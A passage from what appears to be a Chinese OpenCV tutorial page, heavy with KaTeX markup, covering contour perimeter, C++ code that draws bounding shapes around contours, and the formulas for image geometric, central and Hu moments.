style="height:2.9535100000000005em;vertical-align:-1.302113em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.8478869999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.300005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.302113em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361079999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361079999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></span></p><h4 id="轮廓周长"><a class="markdownIt-Anchor" href="#轮廓周长"></a> 轮廓周长</h4><ul><li>L2距离</li></ul><h4 id="代码实现-13"><a class="markdownIt-Anchor" href="#代码实现-13"></a> 代码实现</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">size_t</span> t=<span class="number">0</span>;t&lt;contours.size();t++)&#123;</span><br><span class="line">  <span class="keyword">double</span> area = contourArea(contours[t]);</span><br><span class="line">  <span class="comment">//是否是闭合区域</span></span><br><span class="line">  <span class="keyword">double</span> leng = arcLength(contours[t],<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">if</span> (area&lt;<span class="number">20</span>||len&lt;<span class="number">10</span>)<span class="keyword">continue</span>;</span><br><span class="line">  <span class="comment">//获取外接矩形</span></span><br><span class="line">  Rect box = boundingRect(contours[t]);</span><br><span class="line">  <span class="comment">//绘制外接矩形</span></span><br><span class="line">  rectangle(src,box,)Scalar(<span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span>),<span class="number">2</span>,<span class="number">8</span>,<span class="number">0</span>);</span><br><span class="line">  <span class="comment">//获取最小外接椭圆</span></span><br><span class="line">  RotatedRect rrt = minAreaRect(contours[t]);</span><br><span class="line">  ellipse(src,rrt,Scalar(<span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>),<span class="number">2</span>,<span class="number">8</span>);</span><br><span class="line">  <span class="comment">//获取最小外接矩形</span></span><br><span class="line">  Point2f pts[<span class="number">4</span>];</span><br><span class="line">  rrt.points(pts);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">    line(src,pts[i],pts[(i+<span class="number">1</span>)%<span class="number">4</span>],Scalar(<span class="number">0</span>,<span class="number">255</span>,<span class="number">0</span>),<span class="number">2</span>,<span class="number">8</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//最小外接矩形的角度</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;angle:%.2f\n&quot;</span>,rrt.angle);</span><br><span class="line">  <span class="comment">//绘制轮廓 -1表示填充</span></span><br><span class="line">  drawContours(src,contours,t,Scalar(<span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span>),<span class="number">-1</span>,<span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="匹配"><a class="markdownIt-Anchor" href="#匹配"></a> 匹配</h3><h4 id="图像几何距"><a class="markdownIt-Anchor" href="#图像几何距"></a> 图像几何距</h4><ul><li>一阶矩：p+q=1</li><li>二阶矩：p+q=2</li><li>n阶距：p+q=n</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>m</mi><mrow><mi>p</mi><mo separator="true">,</mo><mi>q</mi></mrow></msub><mo>=</mo><munderover><mo>∑</mo><mrow><mi>x</mi><mo>=</mo><mn>0</mn></mrow><mrow><mi>M</mi><mo>−</mo><mn>1</mn></mrow></munderover><munderover><mo>∑</mo><mrow><mi>y</mi><mo>=</mo><mn>0</mn></mrow><mrow><mi>N</mi><mo>−</mo><mn>1</mn></mrow></munderover><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><msup><mi>x</mi><mi>p</mi></msup><msup><mi>y</mi><mi>q</mi></msup></mrow></mrow><annotation encoding="application/x-tex">m_{p,q}=\sum_{x=0}^{M-1}\sum_{y=0}^{N-1}{f(x,y)x^py^q}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">p</span><span class="mpunct mtight">,</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.2315570000000005em;vertical-align:-1.403221em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8283360000000004em;"><span style="top:-1.882887em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.300005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.10903em;">M</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.267113em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8283360000000002em;"><span style="top:-1.8828869999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.300005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.10903em;">N</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.403221em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.714392em;"><span style="top:-3.1130000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.714392em;"><span style="top:-3.1130000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span></span></span></span></span></span></p><ul><li><p>输入&amp;f(x,y)&amp;是二值图像，只有0,1两种结果</p></li><li><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>m</mi><mrow><mn>1</mn><mo separator="true">,</mo><mn>0</mn></mrow></msub></mrow><annotation encoding="application/x-tex">m_{1,0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mpunct mtight">,</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>代表x方向的累积，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>m</mi><mrow><mn>0</mn><mo separator="true">,</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">m_{0,1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span><span class="mpunct mtight">,</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>代表y方向的累积，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>m</mi><mrow><mn>0</mn><mo separator="true">,</mo><mn>0</mn></mrow></msub></mrow><annotation encoding="application/x-tex">m_{0,0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span><span class="mpunct mtight">,</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>代表像素的累积。可以描述为数学期望</p></li><li><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>x</mi><mrow><mi>a</mi><mi>v</mi><mi>g</mi></mrow></msub><mo>=</mo><mfrac><msub><mi>m</mi><mrow><mn>1</mn><mo separator="true">,</mo><mn>0</mn></mrow></msub><msub><mi>m</mi><mrow><mn>0</mn><mo separator="true">,</mo><mn>0</mn></mrow></msub></mfrac></mrow><annotation encoding="application/x-tex">x_{avg}=\frac{m_{1,0}}{m_{0,0}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">a</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">v</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">g</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.351032em;vertical-align:-0.5423199999999999em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.808712em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428566em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">0</span><span class="mpunct mtight">,</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2818857142857143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.50732em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428566em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mpunct mtight">,</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2818857142857143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5423199999999999em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>代表x方向的平均，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>y</mi><mrow><mi>a</mi><mi>v</mi><mi>g</mi></mrow></msub><mo>=</mo><mfrac><msub><mi>m</mi><mrow><mn>0</mn><mo separator="true">,</mo><mn>1</mn></mrow></msub><msub><mi>m</mi><mrow><mn>0</mn><mo separator="true">,</mo><mn>0</mn></mrow></msub></mfrac></mrow><annotation encoding="application/x-tex">y_{avg}=\frac{m_{0,1}}{m_{0,0}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">a</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">v</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">g</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.351032em;vertical-align:-0.5423199999999999em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.808712em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428566em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">0</span><span class="mpunct mtight">,</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2818857142857143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.50732em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428566em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">0</span><span class="mpunct mtight">,</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2818857142857143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5423199999999999em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>代表y方向的平均，结合起来，就得到图像的平均中心位置</p></li><li><p>中心距的表示方法：</p></li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>μ</mi><mrow><mi>p</mi><mo separator="true">,</mo><mi>q</mi></mrow></msub><mo>=</mo><munderover><mo>∑</mo><mrow><mi>x</mi><mo>=</mo><mn>0</mn></mrow><mrow><mi>M</mi><mo>−</mo><mn>1</mn></mrow></munderover><munderover><mo>∑</mo><mrow><mi>y</mi><mo>=</mo><mn>0</mn></mrow><mrow><mi>N</mi><mo>−</mo><mn>1</mn></mrow></munderover><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>x</mi><mo>−</mo><msub><mi>x</mi><mrow><mi>a</mi><mi>v</mi><mi>g</mi></mrow></msub><msup><mo stretchy="false">)</mo><mi>p</mi></msup><mo stretchy="false">(</mo><mi>y</mi><mo>−</mo><msub><mi>y</mi><mrow><mi>a</mi><mi>v</mi><mi>g</mi></mrow></msub><msup><mo stretchy="false">)</mo><mi>q</mi></msup></mrow></mrow><annotation encoding="application/x-tex">\mu_{p,q}=\sum_{x=0}^{M-1}\sum_{y=0}^{N-1}{f(x,y)(x-x_{avg})^p(y-y_{avg})^q}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">μ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">p</span><span class="mpunct mtight">,</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.2315570000000005em;vertical-align:-1.403221em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8283360000000004em;"><span style="top:-1.882887em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.300005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.10903em;">M</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.267113em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8283360000000002em;"><span style="top:-1.8828869999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.300005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.10903em;">N</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.403221em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">a</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">v</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">g</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.714392em;"><span style="top:-3.1130000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">a</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">v</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">g</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.714392em;"><span style="top:-3.1130000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span></span></span></span></span></span></p><h4 id="图像hu距"><a class="markdownIt-Anchor" href="#图像hu距"></a> 图像Hu距</h4><ul><li>Hu距</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>η</mi><mrow><mi>p</mi><mo separator="true">,</mo><mi>q</mi></mrow></msub><mo>=</mo><mfrac><msub><mi>μ</mi><mrow><mi>p</mi><mo separator="true">,</mo><mi>q</mi></mrow></msub><msubsup><mi>m</mi><mn>00</mn><mrow><mfrac><mrow><mi>p</mi><mo>+</mo><mi>q</mi></mrow><mn>2</mn></mfrac><mo>+</mo><mn>1</mn></mrow></msubsup></mfrac></mrow><annotation encoding="application/x-tex">\eta_{p,q}=\frac{\mu_{p,q}}{m_{00}^{\frac{p+q}{2}+1}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">p</span><span class="mpunct mtight">,</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span 